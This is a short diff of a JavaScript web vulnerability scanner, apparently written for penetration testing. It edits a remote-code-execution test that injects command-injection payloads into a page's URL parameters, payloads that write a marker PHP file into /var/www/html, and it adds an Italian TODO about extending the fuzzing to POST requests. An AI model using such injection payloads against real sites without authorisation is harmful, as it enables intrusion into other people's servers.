@@ -344,7 +344,7 @@
   }
 
   async function testRCE () {
-    const payloads = ['test" || echo "TEST_RCE" > /var/www/html/testRCE.php#', 'echo "TEST_RCE" > /var/www/html/testRCE.php\#']
+    const payloads = ['test" || echo "TEST_RCE" > /var/www/html/testRCE.php#', 'echo "TEST_RCE" > /var/www/html/testRCE.php#']
     const paramsEntitiesTemp = Object.entries(getAllUrlParams(document.location.href))
     // console.log(paramsEntities)
     for (let i = 0; i < paramsEntitiesTemp.length; i++) {
@@ -398,3 +398,5 @@
   console.log('Created by Davide Cavallini')
   console.log('Linkedin: https://www.linkedin.com/in/davidecavallini/')
 })()
+
+// aggiungere funzione $.post che prenda parametri da console e faccia fuzzing come $.get sopra
